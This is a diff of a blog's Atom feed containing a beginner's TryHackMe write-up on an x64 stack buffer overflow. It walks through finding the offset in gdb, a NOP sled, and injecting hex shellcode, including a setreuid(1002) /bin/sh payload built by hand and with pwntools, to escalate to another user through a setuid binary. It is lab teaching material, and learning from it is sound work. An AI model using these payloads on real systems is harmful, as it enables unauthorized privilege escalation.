@@ -9,31 +9,29 @@
   </author>
   <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
   <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
-  <updated>2020-05-19T15:21:00Z</updated>
+  <updated>2020-05-19T16:19:24Z</updated>
   <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
   <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
   <entry>
-    <title>TryHackMe - Buffer Overflows (Bof1) - Task 8</title><author>
+    <title>TryHackMe: Buffer Overflows (Bof1) , Task 8 - Write Up</title><author>
       <name>l1ge</name>
       <uri>https://l1ge.github.io</uri>
     </author>
     <id>https://l1ge.github.io/tryhackme_bof1/</id>
     <updated>2020-05-19T13:00:00Z</updated>
     <published>2020-05-19T13:00:00Z</published>
-    <content type="html"><p><em>Disclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb, r2... At the time I'm writing this there are no write-ups about this room so I can't double check what I'm saying. Don't hesitate to contact me if anything I say is incorrect.</em></p>
+    <content type="html"><p><em>Disclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb...Contact me if anything I say is incorrect.</em></p>
 <h2>0x0 About the room</h2>
 <p><a href="https://tryhackme.com/room/bof1">Bof1's</a> tag line says  &quot;Learn how to get started with basic Buffer Overflows&quot;.  Well, if you consider mastering gdb or r2 and writing your own shell code in assembly is basic, then it's true.</p>
-<p>Many people have been complaining about the difficulty of this room (rated as Easy...) and the opacity of the instructions. I myself asked for help but was told that most people didn't managed to do this room, the challenges are &quot;broken&quot;, I should forget about it.</p>
-<p>Indeed, the shell code the author gives doesn't work. But in the scoreboard I noticed 5 people got all the flags and I already had spent too much time on it to give up so I decided to continue that journey.</p>
-<p>For a beginner like me it was quite tough but in the end I learned A LOT. In this write-up I won't go straight to the point but I'll take you through the mistakes I made and the multiple ways I discovered to achieve each tasks.</p>
+<p>Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. Indeed, the shell code the author gives doesn't work, but the room is not broken.</p>
 <p>Special thanks to rennox and tkiela who kept me on the surface when I was getting overflowed.</p>
 <h2>0x1 Finding the offset</h2>
-<p>As explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address. I will cover here the various way to to it.</p>
+<p>As explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address.</p>
 <p><strong>Method 1: The manual way</strong></p>
-<p>Because we have access to she source code, we know the allocated memory space for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some &quot;<a href="http://www.songho.ca/misc/alignment/dataalign.html">alignment bytes</a>&quot; and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture. I found out these informations on this <a href="https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html">link</a></p>
-<p>Our offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).</p>
-<p>So we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\x41 in hex) until we start to see our 'As' overwriting the return address. For that I'll use gdb which I found easier to use than r2 for beginners.</p>
-<p>Open gdb on your binary<code>$ gdb buffer-overflow</code></p>
+<p>Because we have access to she source code, we know the allocated memory for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some &quot;<a href="http://www.songho.ca/misc/alignment/dataalign.html">alignment bytes</a>&quot; and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture.</p>
+<p>The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).</p>
+<p>So we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\x41 in hex) until we start to see our 'As' overwriting the return address. I'll use gdb which I found easier to use than r2 for beginners.</p>
+<p>Open gdb on your binary <code>$ gdb buffer-overflow</code></p>
 <p>Let's start with 148  'A'.</p>
 <pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*148)&quot;)
 
@@ -77,7 +75,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Program received signal SIGSEGV, Segmentation fault.
 0x0000000000400563 in copy_arg ()
 </code></pre>
-<p>We know that 200 is too far so nothing appears in the return address. We have to check for the pattern in the rbp instead (remember? the rbp comes just before the return address)</p>
+<p>Despite the overflow, the return address doesn't show our pattern. We have to search it somewhere else, in the rbp register instead (remember? the rbp comes just before the return address)</p>
 <p>We do that with the command <code>i r</code> to show all the registers</p>
 <pre><code class="language-bash">(gdb) i r
 rax            0xc9	201
@@ -109,33 +107,11 @@ fs             0x0	0
 [*] Exact match at offset 144
 </code></pre>
 <p>It says that our rbp starts with an offset of 144. We know the rbp is 8 bytes so 144+8 = <strong>152</strong>. The offset we manually found is confirmed.</p>
-<p><strong>Method 3: With gbd-peda</strong></p>
-<p>There is an even easier way to find the buffer with <a href="https://github.com/longld/peda">gdb-peda</a> which adds more feature to gdb.</p>
-<p>Install gdb-peda</p>
-<pre><code class="language-bash">git clone https://github.com/longld/peda.git ~/peda
-echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
-</code></pre>
-<p>And simply restart gdb</p>
-<p>Create a pattern</p>
-<pre><code class="language-bash">gdb-peda$ pattern create 200
-
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
-</code></pre>
-<p>run  with the pattern</p>
-<pre><code class="language-bash">gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
-</code></pre>
-<p>And automatically search for the pattern in the registers with <code>pattern search</code></p>
-<pre><code class="language-bash">gdb-peda$ pattern search
-
-Registers contain pattern buffer:
-RBP+0 found at offset: 144
-</code></pre>
-<p>We can see it also found 144 for the rbp which means <strong>152</strong> for the return address.</p>
 <h2>0x2 Picking a shell code</h2>
 <p>We need a shell code that we will put in our buffer and have the return address points to it. For now I just want a simple shell code, just to drop a shell.</p>
-<p>There are a few on exploit-db like <a href="https://www.exploit-db.com/exploits/41750">this one</a> or <a href="https://www.exploit-db.com/exploits/42179">that one</a>. But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case. Honestly it drove me crazy for 2 days. I was getting SIGILL errors all the time and I didnt understand what I was doing wrong.</p>
+<p>There are a few on exploit-db like <a href="https://www.exploit-db.com/exploits/41750">this one</a> or <a href="https://www.exploit-db.com/exploits/42179">that one</a>. But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case.  I was getting SIGILL errors all the time.</p>
 <p>I later found out why: These short shell codes don't have an exit function call at their end, it means that once I injected these shell codes in the buffer and fucked up the memory, the binary was still trying to execute these fucked up instructions and thus, was reporting &quot;illegal instruction error&quot;.</p>
-<p>I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't fuck up the memory and I didn't get any error. But for this write up I'll only cover the method with the shell code in the buffer.</p>
+<p><em>Side note : I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't fuck up the memory and I didn't get any error.</em></p>
 <p>So bellow is a similar simple shell code that i found but it includes an exit call at the end that will prevent the SIGILL errors.</p>
 <p>The assembly version:</p>
 <pre><code class="language-assembly">    push $0x3b
@@ -160,13 +136,12 @@ RBP+0 found at offset: 144
 <p>This shell code is 40 bytes . I'll cover more about shell codes in the last part of this write up.</p>
 <h2>0x3 Finding the address of the shell code</h2>
 <p>Our payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.</p>
-<p>It will look like this:</p>
 <p>PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).</p>
-<p>There are no specific reason why I put 100 bytes before and 12 bytes after the shellcode. You can try different things as long as the total without the return address is 152.</p>
+<p>There are no specific reason why I put 100 bytes before and 12 bytes after the shell code. You can try different things as long as the total without the return address is 152.</p>
 <p>Let's fill the junk with 'A's for now, and our return address with 6*'B'</p>
 <pre><code class="language-bash">(gdb) run $(python -c &quot;print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)
 </code></pre>
-<p>We will now examine thedump of the hex code with the command <code>x/100x $rsp-200</code> It dumps 100*4 bytes from memory location $rsp -200 bytes.</p>
+<p>We will now examine the dump of the hex code with the command <code>x/100x $rsp-200</code> which dumps 100*4 bytes from memory location $rsp -200 bytes.</p>
 <pre><code class="language-bash">(gdb) x/100x $rsp-200
 0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
 0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
@@ -181,23 +156,14 @@ RBP+0 found at offset: 144
 0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
 0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
 0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
-0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
-0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
-0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
-0x7fffffffe328:	0x00400564	0x00000000	0x00000000	0x00000000
-0x7fffffffe338:	0x7783ce11	0x9ab9c652	0x00400450	0x00000000
-0x7fffffffe348:	0xffffe3e0	0x00007fff	0x00000000	0x00000000
-0x7fffffffe358:	0x00000000	0x00000000	0xbae3ce11	0x6546392d
-0x7fffffffe368:	0x2307ce11	0x6546299a	0x00000000	0x00000000
-0x7fffffffe378:	0x00000000	0x00000000	0x00000000	0x00000000
-0x7fffffffe388:	0xffffe400	0x00007fff	0xf7ffe130	0x00007fff
 </code></pre>
 <p>We see all the 41 that we filled the buffer with. And then we see our shell code.</p>
 <p>To calculate the exact address where the shell code starts,  you first  take the memory address on the left on the same line : 0x7fffffffe2a8. This is the address of the first column on this line (filed with 41 at the moment). And then you add 4 bytes per column. Our shell code is 3 columns further so you need to add 3*4= 12 bytes to that address.</p>
 <p>In hex 12 is 0xC, you need to do 0x7fffffffe2a + 0xC = 0x7fffffffe2b4</p>
 <p>We now got the exact address where the shell code start in the buffer, so we could override the return address with it and it should work.  But sometimes memory shift a bit, from one execution to another the address might change. That's why we use NOPs</p>
+<p><strong>NOPs</strong></p>
 <p>Instead of filling the junk before the shell code with 'A'  we fill it with NOPs (\x90).</p>
-<p>The NOPs are instructions to do nothing. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code.</p>
+<p>The NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.</p>
 <p>Let's replace the 'A's with NOPs and dump our hex again.</p>
 <pre><code class="language-bash">(gdb) run $(python -c &quot;print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)
 
@@ -208,7 +174,6 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000424242424242 in ?? ()
 
 (gdb) x/100x $rsp-200
-
 0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
 0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
 0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 &lt;----- Nops start here
@@ -225,16 +190,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
 0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
 0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
-0x7fffffffe328:	0x00400564	0x00000000	0x00000000	0x00000000
-0x7fffffffe338:	0x9d17eee9	0xb43cbae7	0x00400450	0x00000000
-0x7fffffffe348:	0xffffe3e0	0x00007fff	0x00000000	0x00000000
-0x7fffffffe358:	0x00000000	0x00000000	0x5077eee9	0x4bc34598
-0x7fffffffe368:	0xc993eee9	0x4bc3552f	0x00000000	0x00000000
-0x7fffffffe378:	0x00000000	0x00000000	0x00000000	0x00000000
-0x7fffffffe388:	0xffffe400	0x00007fff	0xf7ffe130	0x00007fff
 </code></pre>
-<p>Because of that you don't need to calculate the exact column as explained before... You can just pick any  line address as long as its in the NOPS, I'll pick 0x7fffffffe298.</p>
-<p>We will use this address to override the return address but first we need to convert it to little endian. (See why in the room's instructions)</p>
+<p>You can now just pick any  address as long as its in the NOPS, I'll pick 0x7fffffffe298.</p>
+<p>We need to convert it to little endian:</p>
 <p>0x7fffffffe298 becomes 0x98e2ffffff7f and eventually \x98\xe2\xff\xff\xff\x7f</p>
 <p>Now let's try to get a shell! We replace the last 6 bytes that were just 6*'B', by this address.</p>
 <p>Let's run it outside gdb to be sure we're in the good environment.</p>
@@ -260,7 +218,7 @@ total 20
 <p>Secret.txt can only be read by user 2, ok we knew that. But the buffer-overflow binary has the the setuid bit (the 's' in the permissions), so I expected that dropping a shell would  give me user2's privileges!  It's not the case and I'll explain why.</p>
 <h2>0x4 About Setuid, Setreuid</h2>
 <p>There are two main reasons why we're not user2:</p>
-<p>First, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says &quot;ok now its necessary to give setuid(UID) to run the next command&quot;.  So I first tried to do that.</p>
+<p>First, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says &quot;now its necessary to give setuid(UID) to run the next command&quot;.  So I first tried to do just that.</p>
 <p>I looked for user's 2 UID</p>
 <pre><code class="language-bash">$ cat /etc/passwd
 root❌0:0:root:/root:/bin/bash
@@ -272,9 +230,9 @@ user3❌1003:1003::/home/user3:/bin/bash
 </code></pre>
 <p>We can see the UID of user2 is 1002. And I looked for a way to add the function <code>setuid(1002)</code> at the top of my shell code and thus become user2 in the shell.</p>
 <p>But... that didn't work. Which takes me to the second reason:</p>
-<p>When you drop the shell, /bin/sh looks at your <strong>real</strong> UID and not your <strong>effective</strong> UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.</p>
-<p>Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root. But since we want to become user2 in our case, we need to use another function: <a href="http://man7.org/linux/man-pages/man2/setreuid.2.html">setreuid()</a></p>
-<p>setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay! &quot;Buffer overflows for beginners&quot; they say !</p>
+<p>When you drop the shell, /bin/sh looks at your <strong>real</strong> UID and not your <strong>effective</strong> UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.  We need to use another function: <a href="http://man7.org/linux/man-pages/man2/setreuid.2.html">setreuid()</a></p>
+<p><em>Side note: Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.</em></p>
+<p>setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay!</p>
 <h2>0x5 Modifying the shell code</h2>
 <p>Depending on your knowledge in assembly and in C, there are different ways to approach it:</p>
 <ul>
@@ -283,11 +241,11 @@ user3❌1003:1003::/home/user3:/bin/bash
 <li>The easiest option : you can use <a href="http://docs.pwntools.com/en/stable/">pwntools</a></li>
 </ul>
 <p><strong>Manually</strong></p>
-<p>I personally did the 2nd option before i realized pwntools would have been easier. I grabbed <a href="http://shell-storm.org/shellcode/files/shellcode-77.php">this shell code</a> that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.</p>
+<p>I personally did the 2nd option before i realized pwntools would have been easier. If you're in a hurry go straight to that part bellow.</p>
+<p>I grabbed <a href="http://shell-storm.org/shellcode/files/shellcode-77.php">this shell code</a> that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.</p>
 <p>First my goal was to setuid(1002), someone helped me to do that. But as I said above, it wasn't enough to become user2. Then I was able to modify it to call setreuid() instead of setuid().  I had to look for the function's %rax number in this <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table</a></p>
 <p>setreuid()'s rax number is 113 ( 0x71in hex).  And it takes its two arguments from the rdi and rsi registers.</p>
 <p>Here was my assembly code in the end:</p>
-<p><em>(There were probably a better way to write this code, I'm just showing you what I did with my beginner instinct, you shouldn't take this as a reference and rather focus on the pwntools option bellow)</em></p>
 <pre><code class="language-assembly">xor    rdi,rdi			&lt;------ set the rdi to 0
 xor    rax,rax		
 xor    rsi, rsi    		&lt;------ set the rsi to 0
@@ -312,8 +270,7 @@ push   0x3c
 pop    rax
 syscall
 </code></pre>
-<p>And I converted it to hex using <a href="https://defuse.ca/online-x86-assembler.htm">Online Assembly</a> (don't forget to check x64 architecture)</p>
-<p>Here's the resulting 62 bytes long shell code in hex.</p>
+<p>And I converted it to hex using <a href="https://defuse.ca/online-x86-assembler.htm">Online Assembly</a> .</p>
 <pre><code class="language-shell">\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05
 </code></pre>
 <p>But if you don't want to bother with trying to understand assembly, there is a much easier way.</p>
@@ -323,11 +280,11 @@ syscall
 <pre><code class="language-bash">$pwn shellcraft -f d amd64.linux.setreuid 1002
 </code></pre>
 <p><code>-f d</code> sets the format to &quot;escaped&quot;.  You can set <code>-f a</code> to look at the assembly version</p>
-<p><em>Note: You could not specify the argument 1002 and it would automatically grab your effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.</em></p>
-<p>It gives you the following shellcode</p>
+<p><em>Side note: It would also work if you don't specify the UID 1002 .  It would automatically grab the effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.</em></p>
+<p>You get you the following shellcode</p>
 <pre><code>\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
 </code></pre>
-<p>We just have to paste it in front of our working shell code from section 0x2. The result is :</p>
+<p>We just have to paste it in front of our working shell code from section 0x2. The result it:</p>
 <pre><code class="language-shell">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
 </code></pre>
 <p>It is now longer,  54 bytes in total, so we have to reduce the number of NOPs to keep the offset at 152.</p>
